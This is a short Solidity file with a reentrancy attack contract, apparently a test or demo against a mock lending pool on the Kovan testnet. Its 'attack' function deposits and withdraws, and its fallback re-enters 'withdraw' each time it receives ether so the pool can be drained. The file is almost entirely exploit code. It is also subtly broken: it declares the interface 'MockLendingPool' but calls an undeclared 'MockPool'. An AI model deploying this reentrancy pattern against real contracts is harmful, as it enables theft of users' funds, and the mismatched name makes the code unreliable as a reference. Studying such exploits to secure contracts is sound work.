pragma solidity 0.6.12;
// Deployed on https://kovan.etherscan.io/address/0x9360487a2ac0aafdb567ee6ca55eb7e9502837d2 
interface MockLendingPool {
    function deposit(
        address asset,
        uint256 amount,
        address onBehalfOf,
        uint16 referralCode
    ) external payable;

    function withdraw(
        address asset,
        uint256 amount,
        address to
    ) external payable;
}

contract ReentrantCaller {
    address contractAddress;

    fallback() external payable {
        if (msg.value > 0) {
            MockPool(contractAddress).withdraw(contractAddress, 1, address(this));
        }
    }

    function attack(address _contractAddress) payable external {
        contractAddress = _contractAddress;
        MockPool(contractAddress).deposit{value: 0.000009 ether}(_contractAddress, 1, address(this), 0);
        MockPool(contractAddress).withdraw(contractAddress, 1, address(this));
    }
}
